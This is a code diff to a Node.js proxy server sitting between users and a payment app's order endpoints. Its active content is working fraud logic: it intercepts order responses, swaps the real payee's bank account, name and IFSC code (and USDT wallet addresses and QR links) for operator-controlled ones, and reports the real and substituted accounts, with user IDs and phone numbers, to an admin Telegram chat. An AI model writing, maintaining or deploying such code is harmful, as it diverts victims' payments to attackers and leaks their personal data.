@@ -1717,58 +1717,18 @@ app.post('/app/payment/order/create', async (req, res) => {
     const isSuccess = jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000' || jsonResp.code === '200');
 
     if (isSuccess && data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
-      const orderData = getResponseData(jsonResp);
-      const d = (orderData && typeof orderData === 'object' && !Array.isArray(orderData)) ? orderData : {};
+      const body = req.parsedBody || {};
       const phone = getPhone(data, userId);
-      const orderId = d.orderId || d.orderNo || d.buyId || d.id || req.parsedBody?.orderId || 'N/A';
-      const orderAmt = parseFloat(d.amount || d.orderAmount || d.buyAmount || req.parsedBody?.amount || 0) || 0;
-
-      const realAcct = d.payeeAccount || d.receiveAccount || d.bankAccount || d.account || d.accountNo || 'N/A';
-      const realName = d.payeeName || d.receiveName || d.accountName || d.beneficiaryName || d.accountHolder || 'N/A';
-      const realIfsc = d.ifsc || d.ifscCode || d.receiveIfsc || 'N/A';
-
-      const activeBank = getActiveBank(data, userId);
-      let bankSection = '';
-      if (activeBank) {
-        if (activeBank.minAmount && orderAmt > 0 && orderAmt < activeBank.minAmount) {
-          bankSection =
-            `⚠️ Bank NOT Replaced\n` +
-            `   Reason: Order ₹${orderAmt} < Min ₹${activeBank.minAmount}`;
-        } else {
-          const bothKnown = realAcct !== 'N/A' && realName !== 'N/A';
-          if (bothKnown) {
-            bankSection =
-              `🏦 Real Bank:\n` +
-              `   Acc: ${realAcct}\n` +
-              `   Name: ${realName}\n` +
-              `${realIfsc !== 'N/A' ? '   IFSC: ' + realIfsc + '\n' : ''}` +
-              `━━━━━━━━━━━━━━━━━━\n` +
-              `🔄 Replaced With:\n` +
-              `   Acc: ${activeBank.accountNo}\n` +
-              `   Name: ${activeBank.accountHolder}\n` +
-              `   IFSC: ${activeBank.ifsc}${activeBank.bankName ? ' | ' + activeBank.bankName : ''}`;
-          } else {
-            bankSection =
-              `🔄 Replaced Bank:\n` +
-              `   Acc: ${activeBank.accountNo}\n` +
-              `   Name: ${activeBank.accountHolder}\n` +
-              `   IFSC: ${activeBank.ifsc}${activeBank.bankName ? ' | ' + activeBank.bankName : ''}`;
-          }
-        }
-      } else {
-        bankSection = `⚠️ No active bank set — not replaced`;
-      }
-
+      const orderId = body.orderId || body.orderNo || body.buyId || 'N/A';
+      const orderAmt = parseFloat(body.amount || body.orderAmount || body.buyAmount || 0) || 0;
       const msg =
         `✅ Order Created!\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
         `👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n` +
         `📋 Order ID: ${orderId}\n` +
         `💰 Amount: ₹${orderAmt || 'N/A'}\n` +
-        `🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n` +
-        `━━━━━━━━━━━━━━━━━━\n` +
-        bankSection;
-
+        `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n` +
+        `(Bank details in next message ↓)`;
       bot.sendMessage(data.adminChatId, msg).catch(()=>{});
     }
 
@@ -1821,18 +1781,45 @@ app.post('/app/payment/order/cancel', async (req, res) => {
 app.all('/app/payment/order/orderInfo', async (req, res) => {
   const data = await loadData();
   if (!data.botEnabled) return await transparentProxy(req, res);
-  const bank = await getActiveBankAndSave(data);
+
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const detailData = getResponseData(jsonResp);
+
+    const userId = await extractUserIdFromToken(req) || await extractUserId(req, jsonResp);
+    const bank = getActiveBank(data, userId);
+
+    if (data.adminChatId && bot && debugNextResponse) {
+      debugNextResponse = false;
+      bot.sendMessage(data.adminChatId, `🔍 OrderInfo:\n${JSON.stringify(jsonResp, null, 2).substring(0, 3500)}`).catch(()=>{});
+    }
+
     if (detailData) {
+      const dd = (typeof detailData === 'object' && !Array.isArray(detailData)) ? detailData : {};
+      const orderAmt = parseFloat(
+        dd.amount || dd.orderAmount || dd.buyAmount || dd.unpaidAmount || dd.totalAmount || 0
+      ) || 0;
+
+      const realAcct = dd.payeeAccount || dd.receiveAccount || dd.bankAccount || dd.accountNo || dd.account || '';
+      const realName = dd.payeeName || dd.receiveName || dd.accountName || dd.beneficiaryName || dd.accountHolder || '';
+      const realIfsc = dd.ifsc || dd.ifscCode || dd.receiveIfsc || '';
+
+      let replaced = false;
+      let notReplacedReason = '';
+
       if (bank) {
-        if (Array.isArray(detailData)) {
-          detailData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bank, {}, 0); });
+        if (bank.minAmount && orderAmt > 0 && orderAmt < bank.minAmount) {
+          notReplacedReason = `Order ₹${orderAmt} < Min ₹${bank.minAmount}`;
         } else {
-          deepReplace(detailData, bank, {}, 0);
+          replaced = true;
+          if (Array.isArray(detailData)) {
+            detailData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bank, {}, 0); });
+          } else {
+            deepReplace(detailData, bank, {}, 0);
+          }
         }
       }
+
       if (data.usdtAddress) {
         replaceUsdtInResponse(jsonResp, data);
         const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(data.usdtAddress)}`;
@@ -1841,11 +1828,50 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
         str = str.replace(/https?:\/\/[^\s"',\\}]+(qr|QR|qrcode|code)[^\s"',\\}]*/gi, qrUrl);
         try { Object.assign(jsonResp, JSON.parse(str)); } catch(e) {}
       }
+
+      if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
+        const phone = getPhone(data, userId);
+        const orderId = dd.orderId || dd.orderNo || dd.buyId || req.query?.buyId || req.query?.orderId || 'N/A';
+        let bankSection = '';
+        if (replaced && bank) {
+          if (realAcct && realName) {
+            bankSection =
+              `🏦 Real Bank:\n` +
+              `   Acc: ${realAcct}\n` +
+              `   Name: ${realName}\n` +
+              `${realIfsc ? '   IFSC: ' + realIfsc + '\n' : ''}` +
+              `━━━━━━━━━━━━━━━━━━\n` +
+              `🔄 Replaced With:\n` +
+              `   Acc: ${bank.accountNo}\n` +
+              `   Name: ${bank.accountHolder}\n` +
+              `   IFSC: ${bank.ifsc}${bank.bankName ? ' | ' + bank.bankName : ''}`;
+          } else {
+            bankSection =
+              `🔄 Replaced Bank:\n` +
+              `   Acc: ${bank.accountNo}\n` +
+              `   Name: ${bank.accountHolder}\n` +
+              `   IFSC: ${bank.ifsc}${bank.bankName ? ' | ' + bank.bankName : ''}`;
+          }
+        } else if (notReplacedReason) {
+          bankSection = `⚠️ Bank NOT Replaced\n   Reason: ${notReplacedReason}`;
+        } else {
+          bankSection = `⚠️ No active bank set`;
+        }
+
+        const msg =
+          `📋 Order Details Loaded\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n` +
+          `📋 Order ID: ${orderId}\n` +
+          `💰 Amount: ₹${orderAmt || 'N/A'}\n` +
+          `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          bankSection;
+
+        bot.sendMessage(data.adminChatId, msg).catch(()=>{});
+      }
     }
-    if (data.adminChatId && bot && debugNextResponse) {
-      debugNextResponse = false;
-      bot.sendMessage(data.adminChatId, `🔍 OrderInfo:\n${JSON.stringify(jsonResp, null, 2).substring(0, 3500)}`).catch(()=>{});
-    }
+
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
 });
